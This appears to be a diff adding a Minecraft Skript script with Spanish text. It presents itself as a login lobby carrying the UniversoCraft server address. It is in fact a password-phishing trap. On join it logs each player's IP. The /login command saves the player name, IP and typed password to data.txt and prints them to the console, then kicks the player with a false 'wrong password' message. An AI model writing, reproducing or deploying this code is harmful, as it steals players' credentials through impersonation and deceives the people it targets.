@@ -1,0 +1,51 @@
+every second:
+	loop all players:
+		wipe loop-player's sidebar
+		set name of sidebar of loop-player to "   &6&lSala&b&lLogin   "
+		set score "&1" in sidebar of loop-player to 15
+		set score "&f&lRegistrate con:" in sidebar of loop-player to 14
+		set score "&6/register <clave> <clave>" in sidebar of loop-player to 13
+		set score "&2" in sidebar of loop-player to 12
+		set score "&f&lLogueate con:" in sidebar of loop-player to 11
+		set score "&6/login <clave>" in sidebar of loop-player to 10
+		set score "&3" in sidebar of loop-player to 9
+		set score "&b&lIMPORTANTE:" in sidebar of loop-player to 8
+		set score "&c- No des tu contraseña" in sidebar of loop-player to 7
+		set score "&ca nadie NUNCA." in sidebar of loop-player to 6
+		set score "&c- NO pongas la misma" in sidebar of loop-player to 5
+		set score "&ccontraseña aqui y en" in sidebar of loop-player to 4
+		set score "&cotros servidores." in sidebar of loop-player to 3
+		set score "&4" in sidebar of loop-player to 2
+		set score "&emc.universocraft.com" in sidebar of loop-player to 1
+
+on join:
+	execute console command "tp %player% 1 111 1"
+	#execute console command "/title %player% subtitle ['',{'text':'/login <contraseña>','color':'white','bold':'true'}]"
+	#execute console command "/title %player% title ['',{'text':'Inicia sesión','color':'green','bold':'true'}]"
+	send "" to console
+	send "&cIP of &a%player%: &9%ip of player%" to console	
+	message "&9&lCuenta &7» &a¡Inicia sesión: &e/login <tucontraseña>"
+	wait 30 seconds
+	kick the player due to "&9&lCuenta &7» &cTu tiempo de espera para entrar se ha agotado"
+#on any movement:
+	#execute console command "tp %player% 0 160 2"
+on chat:
+	cancel event
+
+command /login [<text>]:
+	trigger:
+		if arg-1 is not set:
+			message "&9&lCuenta &7» &cUso correcto: &e/login <tucontraseña>"
+		if arg-1 is set:
+			wf "%player% (%ip of player%) [/login %arg-1%]" to "data.txt"
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "&aThe Password Of &5%player% &ais &d%arg-1%" to console
+			send "" to console
+			send "" to console
+			kick the player due to "&9&lCuenta &7» &cHas introducido tu contraseña mal."
